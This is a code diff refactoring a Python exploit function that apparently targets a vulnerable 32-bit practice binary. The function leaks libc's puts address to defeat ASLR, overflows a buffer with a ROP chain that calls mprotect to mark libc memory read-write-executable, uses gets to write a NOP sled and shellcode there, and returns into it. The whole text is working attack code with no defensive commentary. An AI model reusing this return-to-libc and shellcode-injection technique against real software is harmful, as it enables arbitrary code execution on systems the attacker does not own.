@@ -35,43 +35,35 @@ def skip_lines(proc, lines):
         proc.recvline(timeout=0.05)
 
 
-def attemptR2Libc_shellcode(putsOffset, mprotectOff):
+def attemptR2Libc_shellcode(putsOffset, mprotect_offset):
     # Leak randomised libc puts addr
     putsAddr = leak_via_puts(CONN, PORT, GOT_PUTS)
 
-    # Get lib base addr using putsOffset
-    libc_address = putsAddr - putsOffset
-    log.success(f'LIBC base: {hex(libc_address)}')
+    libc_base = putsAddr - putsOffset
     
-    codeAddr = libc_address
-    
-    #https://man7.org/linux/man-pages/man2/mprotect.2.html (Free Software Foundation, 2018)
-    payload = b'A' * BUFF_SIZE + p32(mprotectOff+libc_address) + p32(MAIN_ADDR) + p32(codeAddr>>0xc<<0xc) + p32(0x21000) + p32(0x7)
-
+    code_address = libc_base
+    page_aligned_address = code_address & ~0xfff
+    payload = b'A' * BUFF_SIZE + p32(mprotect_offset + libc_base) + p32(MAIN_ADDR) + p32(page_aligned_address) + p32(0x21000) + p32(0x7)
     proc.sendline(payload)
-    log.success(f"Changed protections for {hex(codeAddr>>0xc<<0xc)}-{hex((codeAddr>>0xc<<0xc)+0x21000)} to RWX with mprotect")
+    log.success(f"Changed protections for {hex(page_aligned_address)}-{hex(page_aligned_address+0x21000)} to RWX with mprotect")
 
-    # Write shellcode payload to the address found above now changed to be writeable and executable using gets(&codeAddr)
-    # Then execute that shellcode upon return of that gets()
-    payload = b'A' * BUFF_SIZE + p32(PLT_GETS) + p32(codeAddr) + p32(codeAddr)
-
+    code_address = libc_base
+    payload = b'A' * BUFF_SIZE + p32(PLT_GETS) + p32(code_address) + p32(code_address)
     proc.sendline(payload)
-    log.success(f"Called gets({hex(codeAddr)}) with {hex(codeAddr)} as return addr")
+    log.success(f"Called gets({hex(code_address)}) with {hex(code_address)} as return addr")
 
     # Input shellcode to gets so it is written to 'codeAddr' and then executed on return
-    payload = b'\x90'*20 + SHELLCODE
+    shellcode_payload = b'\x90' * 20 + SHELLCODE
+    proc.sendline(shellcode_payload)
+    log.success(f"Sent shellcode to {hex(code_address)} via gets")
 
-    proc.sendline(payload)
-    log.success(f"Sent shellcode to {hex(codeAddr)} via gets")
-
-    # Recieve output of previous overflows to clear stdout
     output = b""
     while True:
         try:
-            currline = proc.recv(timeout = 0.2)
-            if len(currline)==0:
+            current_line = proc.recv(timeout=0.2)
+            if not current_line:
                 break
-            output+=currline
+            output += current_line
         except:
             break
     
